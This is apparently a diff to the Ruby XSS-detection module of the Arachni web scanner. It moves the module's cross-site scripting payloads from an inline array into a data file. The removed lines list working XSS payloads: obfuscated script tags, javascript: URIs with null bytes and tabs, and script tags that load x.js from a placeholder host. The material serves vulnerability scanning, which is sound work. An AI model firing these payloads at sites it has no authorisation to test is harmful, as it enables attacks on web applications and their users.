@@ -30,39 +30,28 @@ class XSS < Arachni::Module::Base
     def initialize( page_data, structure )
         super( page_data, structure )
 
-        @__injection_strs = []
-        
-        @results = []
-    end
-
-    def prepare( )
-        @__injection_strs = [
-            '<SCrIPT>alert("RANDOMIZE")</SCrIPT>',
-             "<ScRIPT>a=/RANDOMIZE/\nalert(a.source)</SCRiPT>",
-             "<ScRIpT>alert(String.fromCharCode(RANDOMIZE))</SCriPT>",
-             "'';!--\"<RANDOMIZE>=&{()}",
-             "<ScRIPt SrC=http://RANDOMIZE/x.js></ScRIPt>",
-             "<ScRIPt/XSS SrC=http://RANDOMIZE/x.js></ScRIPt>",
-             "<ScRIPt/SrC=http://RANDOMIZE/x.js></ScRIPt>",
-             "<\0SCrIPT>alert(\"RANDOMIZE\")</SCrIPT>",
-             "<SCR\0IPt>alert(\"RANDOMIZE\")</Sc\0RIPt>",
-             "<IFRAME SRC=\"javascript:alert('RANDOMIZE');\"></IFRAME>",
-             "jAvasCript:alert(\"RANDOMIZE\");",
-             "javas\tcript:alert(\"RANDOMIZE\");",
-             "javas&#x09;cript:alert(\"RANDOMIZE\");",
-             "javas\0cript:alert(\"RANDOMIZE\");",
-             "';alert(String.fromCharCode(88,83,83))//\';alert(String." +
-             "fromCharCode(88,83,83))//;alert(String.fromCharCode(88," +
-             "83,83))//;alert(String.fromCharCode(88,83,83))//--></S" +
-             "CRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
-        ]
+        @__injection_strs_file = []
+        @results    = []
     end
     
+    def prepare( )
+        @__injection_strs_file = 'injection_strings.txt'
+    end
+
     def run( )
-        
-        @__injection_strs.each {
+
+        #
+        # it's better to save big arrays to a file
+        # a big array is ugly, messy and can't be updated as easily
+        #
+        # but don't open the file yourself, use get_data_file( filename )
+        # with a block and read each line
+        #
+        # the file must be under modules/<modname>/<filename>
+        #
+        get_data_file( @__injection_strs_file ) {
             |str|
-            
+
             enc_str = URI.encode( str )
             
             audit_forms( str, Regexp.new( str ), str ).each {
